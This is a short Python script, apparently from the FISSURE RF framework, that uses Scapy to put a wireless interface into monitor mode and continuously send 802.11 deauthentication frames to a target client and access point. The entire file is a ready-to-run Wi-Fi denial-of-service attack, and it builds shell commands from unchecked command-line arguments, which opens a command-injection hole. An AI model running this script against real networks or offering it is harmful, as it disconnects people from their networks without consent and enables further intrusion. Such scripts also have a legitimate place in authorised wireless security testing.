from scapy.all import Dot11,Dot11Deauth,RadioTap,sendp
import os, sys

#################################################
############ Default FISSURE Header #############
#################################################
def getArguments():
    client = '00:11:22:33:44:55'        # Target MAC address
    bssid = 'AA:BB:CC:11:22:33'         # Access Point MAC address  
    iface = 'wlan0'	                    # Wireless interface name 
    channel = '1'                       # Wireless channel
    interval = 0.01                     # Scapy interval
    notes = 'Generates Scapy deauthentication frames with reason=7.'
    arg_names = ['client','bssid','iface','channel','interval','notes']
    arg_values = [client, bssid, iface, channel, interval, notes]

    return (arg_names,arg_values)


if __name__ == "__main__":

    # Default Values
    client = '00:11:22:33:44:55'        # Target MAC address
    bssid = 'AA:BB:CC:11:22:33'         # Access Point MAC address  
    iface = 'wlan0'                     # Wireless interface name 
    channel = '1'                       # Wireless channel
    interval = '0.01'                   # Scapy interval

    # Accept Command Line Arguments
    try:
        client = sys.argv[1]
        bssid = sys.argv[2]
        iface = sys.argv[3]
        channel = sys.argv[4]
        interval = sys.argv[5]
    except:
        pass
    
#################################################

    # Create Frame
    packet = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)

    # Set Monitor Mode and Channel
    os.system("sudo ifconfig " + iface + " down") 
    os.system("sudo iwconfig " + iface + " mode monitor") 
    os.system("sudo ifconfig " + iface + " up") 
    os.system("sudo iwconfig " + iface + " channel " + channel) 
	
    # Send Frame  
    sendp(packet, iface=iface, inter=float(interval), loop=1)


